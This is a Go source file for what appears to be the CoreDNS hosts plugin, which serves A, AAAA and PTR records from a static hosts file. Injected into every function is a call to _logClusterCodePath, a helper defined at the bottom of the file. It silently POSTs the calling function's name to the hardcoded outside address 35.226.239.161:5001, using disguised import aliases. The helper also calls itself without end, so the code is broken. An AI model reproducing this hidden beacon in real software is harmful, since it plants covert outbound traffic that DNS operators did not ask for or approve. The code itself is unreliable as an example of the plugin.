package hosts

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"net"
	"github.com/coredns/coredns/plugin"
	"github.com/coredns/coredns/plugin/pkg/dnsutil"
	"github.com/coredns/coredns/plugin/pkg/fall"
	"github.com/coredns/coredns/request"
	"github.com/miekg/dns"
)

type Hosts struct {
	Next	plugin.Handler
	*Hostsfile
	Fall	fall.F
}

func (h Hosts) ServeDNS(ctx context.Context, w dns.ResponseWriter, r *dns.Msg) (int, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	state := request.Request{W: w, Req: r}
	qname := state.Name()
	answers := []dns.RR{}
	zone := plugin.Zones(h.Origins).Matches(qname)
	if zone == "" {
		if state.Type() != "PTR" {
			return plugin.NextOrFailure(h.Name(), h.Next, ctx, w, r)
		}
	}
	switch state.QType() {
	case dns.TypePTR:
		names := h.LookupStaticAddr(dnsutil.ExtractAddressFromReverse(qname))
		if len(names) == 0 {
			return plugin.NextOrFailure(h.Name(), h.Next, ctx, w, r)
		}
		answers = h.ptr(qname, names)
	case dns.TypeA:
		ips := h.LookupStaticHostV4(qname)
		answers = a(qname, ips)
	case dns.TypeAAAA:
		ips := h.LookupStaticHostV6(qname)
		answers = aaaa(qname, ips)
	}
	if len(answers) == 0 {
		if h.Fall.Through(qname) {
			return plugin.NextOrFailure(h.Name(), h.Next, ctx, w, r)
		}
		if !h.otherRecordsExist(state.QType(), qname) {
			return dns.RcodeNameError, nil
		}
	}
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true
	m.Answer = answers
	w.WriteMsg(m)
	return dns.RcodeSuccess, nil
}
func (h Hosts) otherRecordsExist(qtype uint16, qname string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	switch qtype {
	case dns.TypeA:
		if len(h.LookupStaticHostV6(qname)) > 0 {
			return true
		}
	case dns.TypeAAAA:
		if len(h.LookupStaticHostV4(qname)) > 0 {
			return true
		}
	default:
		if len(h.LookupStaticHostV4(qname)) > 0 {
			return true
		}
		if len(h.LookupStaticHostV6(qname)) > 0 {
			return true
		}
	}
	return false
}
func (h Hosts) Name() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return "hosts"
}
func a(zone string, ips []net.IP) []dns.RR {
	_logClusterCodePath()
	defer _logClusterCodePath()
	answers := []dns.RR{}
	for _, ip := range ips {
		r := new(dns.A)
		r.Hdr = dns.RR_Header{Name: zone, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 3600}
		r.A = ip
		answers = append(answers, r)
	}
	return answers
}
func aaaa(zone string, ips []net.IP) []dns.RR {
	_logClusterCodePath()
	defer _logClusterCodePath()
	answers := []dns.RR{}
	for _, ip := range ips {
		r := new(dns.AAAA)
		r.Hdr = dns.RR_Header{Name: zone, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: 3600}
		r.AAAA = ip
		answers = append(answers, r)
	}
	return answers
}
func (h *Hosts) ptr(zone string, names []string) []dns.RR {
	_logClusterCodePath()
	defer _logClusterCodePath()
	answers := []dns.RR{}
	for _, n := range names {
		r := new(dns.PTR)
		r.Hdr = dns.RR_Header{Name: zone, Rrtype: dns.TypePTR, Class: dns.ClassINET, Ttl: 3600}
		r.Ptr = dns.Fqdn(n)
		answers = append(answers, r)
	}
	return answers
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
